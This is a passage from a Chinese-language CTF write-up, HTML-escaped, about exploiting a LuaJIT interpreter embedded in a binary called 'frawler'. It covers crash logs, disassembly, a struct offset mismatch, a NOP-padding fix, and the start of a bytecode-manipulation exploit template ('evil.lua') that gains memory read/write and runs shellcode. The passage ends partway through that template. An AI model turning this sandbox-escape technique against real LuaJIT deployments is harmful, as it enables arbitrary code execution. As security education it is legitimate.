  &lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// rdi&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// rbx&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2448&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2448&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2480&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mcode_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;崩溃位置：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;LOAD:000000000002BD70
LOAD:000000000002BD70 loc_2BD70:
LOAD:000000000002BD70 mov     rbx, [rdi] &amp;lt;-- 崩溃，rdi = 0x4321
LOAD:000000000002BD73 mov     rsi, [rdi+8]
LOAD:000000000002BD77 call    mcode_free
LOAD:000000000002BD7C mov     rdi, rbx
LOAD:000000000002BD7F test    rbx, rbx
LOAD:000000000002BD82 jnz     short loc_2BD70
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;对比原函数：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;/* Free all MCode areas. */
void lj_mcode_free(jit_State *J)
{
  MCode *mc = J-&amp;gt;mcarea;
  J-&amp;gt;mcarea = NULL;
  J-&amp;gt;szallmcarea = 0;
  while (mc) {
    MCode *next = ((MCLink *)mc)-&amp;gt;next;
    mcode_free(J, mc, ((MCLink *)mc)-&amp;gt;size);
    mc = next;
  }
}
​
static void mcode_free(jit_State *J, void *p, size_t sz)
{
  UNUSED(J); UNUSED(sz);
  VirtualFree(p, 0, MEM_RELEASE);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;J&lt;/code&gt;参数没有用到，似乎被优化掉了，所以只传入了两个参数。更漂亮的是在这里直接得到了mcarea在&lt;code&gt;jit_State&lt;/code&gt;中的偏移，这样应该就可以去对比一下了。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;gef➤  p (uint64_t)(&amp;amp;((GG_State*)0x40000378).J.mcarea)-(uint64_t)(&amp;amp;((GG_State*)0x40000378).J)
$7 = 0x988
​
&amp;gt;&amp;gt;&amp;gt; 0x988
2440
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;而函数里的为2448，看来确实是错位了，虽然不知道是什么原因，这里也解释了为什么原exp无法正常使用了。&lt;/p&gt;&lt;p&gt;这样是不是还原到原exp就可以使用了呢？&lt;/p&gt;&lt;p&gt;运行结果：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;[49833.577] 01105.01119&amp;gt; &amp;lt;== general fault, PC at 0x50c8d6669d70
[49833.577] 01105.01119&amp;gt;  CS:                   0 RIP:     0x50c8d6669d70 EFL:              0x286 CR2:                  0
[49833.577] 01105.01119&amp;gt;  RAX:         0xffffffff RBX: 0x9090909090909090 RCX:     0x7e0029445a42 RDX:                  0
[49833.577] 01105.01119&amp;gt;  RSI:                  0 RDI: 0x9090909090909090 RBP:      0x9b703aacc60 RSP:      0x9b703aacc50
[49833.577] 01105.01119&amp;gt;   R8:                  0  R9:                  0 R10:                  0 R11:              0x206
[49833.577] 01105.01119&amp;gt;  R12:         0x10000558 R13:         0x100003b8 R14:
​
[49833.593] 01105.01119&amp;gt; bt#01: pc 0x50c8d6669d70 sp 0x9b703aacc50 (app:/pkg/bin/frawler,0x2bd70)
[49833.593] 01105.01119&amp;gt; bt#02: pc 0x50c8d66600d4 sp 0x9b703aacc70 (app:/pkg/bin/frawler,0x220d4)
[49833.594] 01105.01119&amp;gt; bt#03: pc 0x50c8d6677b81 sp 0x9b703aaccb0 (app:/pkg/bin/frawler,0x39b81)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;真正麻烦的来了，这里访问了无效内存，rdi的值变为了0x909090，明显是我们填入的nop的值，可是为什么nop的值变成了这里的rdi，也就是&lt;code&gt;mcarea&lt;/code&gt;？这个时候没有调试器就显得非常难受了，往回追溯一下，上一层调用到&lt;code&gt;lj_mcode_free&lt;/code&gt;的位置：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;LOAD:00000000000220A1
LOAD:00000000000220A1 loc_220A1:
LOAD:00000000000220A1 mov     word ptr [r13+1F0h], 0
LOAD:00000000000220AB mov     dword ptr [r13+2E0h], 0
LOAD:00000000000220B6 lea     rdi, [r13+870h] ; s
LOAD:00000000000220BD xor     r14d, r14d
LOAD:00000000000220C0 mov     edx, 200h       ; n
LOAD:00000000000220C5 xor     esi, esi        ; c
LOAD:00000000000220C7 call    _memset
LOAD:00000000000220CC mov     rdi, r12 ; &amp;lt;-- r12是没有用到的，但是是作为了`lj_mcode_free` 的参数
LOAD:00000000000220CF call    lj_mcode_free ; &amp;lt;-- 调用到了这里崩溃
LOAD:00000000000220D4 mov     rdi, r12
LOAD:00000000000220D7 call    sub_2BD90
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;再看寄存器值，&lt;code&gt;r12&lt;/code&gt;为&lt;code&gt;0x10000558&lt;/code&gt;，也就是&lt;code&gt;jit_State&lt;/code&gt;的地址，但是为什么在传入到&lt;code&gt;mcode_free&lt;/code&gt;的时候，&lt;code&gt;mcarea&lt;/code&gt;的值不对了呢？我们不是已经设置好&lt;code&gt;mcarea&lt;/code&gt;了吗，怎么会变成了nop值？需要调试方法了。&lt;/p&gt;&lt;p&gt;怎么办？还好我们有任意读写，那么我们可以在触发jit的奇怪逻辑之前，试试看任意读dump出来想要的内容。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;    local mcarea = mctab[1]
    mctab[0] = 0
    mctab[1] = asaddr / 2^52 / 2^1022
    mctab[2] = mctab[1]
    mctab[3] = mctab[1]
    mctab[4] = 2^12 / 2^52 / 2^1022
​
    hexdump_print(0x10000558 + 2440, 0x30) -- 注意这里查看量太大会触发jit，所以不能太大
​
    while mctab[0] == 0 do end
    &#39;00 00 00 00 00 00 00 00 00 50 01 10 00 00 00 00 \n&#39;
    &#39;00 50 01 10 00 00 00 00 00 50 01 10 00 00 00 00 \n&#39;
    &#39;00 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \n&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;与我们期望的一致，那么确认了在进入的时候是没有问题的，只能是在&lt;code&gt;lj_mcode_free&lt;/code&gt;的循环中出了问题，&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;LOAD:000000000002BD70
LOAD:000000000002BD70 loc_2BD70:
LOAD:000000000002BD70 mov     rbx, [rdi]
LOAD:000000000002BD73 mov     rsi, [rdi+8]
LOAD:000000000002BD77 call    mcode_free
LOAD:000000000002BD7C mov     rdi, rbx ; &amp;lt;-- 这里改动了rdi
LOAD:000000000002BD7F test    rbx, rbx
LOAD:000000000002BD82 jnz     short loc_2BD70
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;对比原函数，这里是由于在找到链表下一个的时候出了问题，看起来链表下一个的位置位于&lt;code&gt;+0&lt;/code&gt;offset的位置，因为是直接把rbx取出来的。那么也就是，将&lt;code&gt;0x10015000&lt;/code&gt;作为了链表下一个位置，那看看这个地址的内容呢。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;    &#39;90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 \n&#39;
    &#39;90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 \n&#39;
    &#39;90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 \n&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;果不其然，这里就是我们填充的内容！那么问题的来源就清楚了，其实本质上讲由于我们的跳转是精准的，并不需要nop来slip，那么直接把nop4k的填充内容改为&lt;code&gt;00&lt;/code&gt;就解决了，&lt;/p&gt;&lt;p&gt;这么一个小小的问题，导致了这个题卡了我好久。。&lt;/p&gt;&lt;p&gt;另外一个需要注意的小问题是shellcode的问题，寄存器状态和上一种方法已经不同了，我们得重新去找到text段基地址等，不过已经有shellcode执行了，这些都是很小的事情了吧。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;exploit&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;orig_exp.tpl.lua&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-lua&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;-- The following function serves as the template for evil.lua.&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;-- The general outline is to compile this function as-written, dump&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;-- it to bytecode, manipulate the bytecode a bit, and then save the&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;-- result as evil.lua.&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;evil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;-- This is the x86_64 native code which we&#39;ll execute. It&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;-- is a very benign payload which just prints &quot;Hello World&quot;&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;-- and then fixes up some broken state.&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SHELLCODE_TPL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;-- The dirty work is done by the following &quot;inner&quot; function.&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;-- This inner function exists because we require a vararg call&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;-- frame on the Lua stack, and for the function associated with&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;-- said frame to have certain special upvalues.&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;inner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(...)&lt;/span&gt;
    &lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;then&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;-- The following three lines turn into three bytecode&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;-- instructions. We munge the bytecode slightly, and then&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;-- later reinterpret the instructions as a cdata object,&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;-- which will end up being `cdata&amp;lt;const char *&amp;gt;: NULL`.&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;-- The `if false` wrapper ensures that the munged bytecode&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;-- isn&#39;t executed.&lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32749&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;cdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;cdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- Through the power of bytecode manipulation, the&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- following three functions will become (the fast paths of)&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- string.byte, string.char, and string.sub. This is&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- possible because LuaJIT has bytecode instructions&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- corresponding to the fast paths of said functions. Note&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- that we musn&#39;t stray from the fast path (because the&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- fallback C code won&#39;t be wired up). Also note that the&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- interpreter state will be slightly messed up after&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- calling one of these functions.&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;s_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;s_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;s_sub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- The following function does nothing, but calling it will&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- restore the interpreter state which was messed up following&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- a call to one of the previous three functions. Because this&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- function contains a cdata literal, loading it from bytecode&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- will result in the ffi library being initialised (but not&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- registered in the global namespace).&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;resync&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LL&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- Helper function to reinterpret the first four bytes of a&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- string as a uint32_t, and return said value as a number.&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;s_uint32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
      &lt;span class=&quot;kr&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;do&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s_sub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;resync&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
      &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
      &lt;span class=&quot;kr&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;
    &lt;span class=&quot;kr&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- The following line obtains the address of the GCfuncL&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- object corresponding to &quot;inner&quot;. As written, it just fetches&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- the 0th upvalue, and does some arithmetic. After some&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- bytecode manipulation, the 0th upvalue ends up pointing&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- somewhere very interesting: the frame info TValue containing&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- func|FRAME_VARG|delta. Because delta is small, this TValue&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- will end up being a denormalised number, from which we can&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- easily pull out 32 bits to give us the &quot;func&quot; part.&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;iaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1022&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- The following five lines read the &quot;pc&quot; field of the GCfuncL&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- we just obtained. This is done by creating a GCstr object&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- overlaying the GCfuncL, and then pulling some bytes out of&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- the string. Bytecode manipulation results in a nice KPRI&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- instruction which preserves the low 32 bits of the istr&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- TValue while changing the high 32 bits to specify that the&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;-- low 32 bits contain a GCstr*.&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;istr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;istr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32764&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- Turned into KPRI(str)&lt;/span&gt;
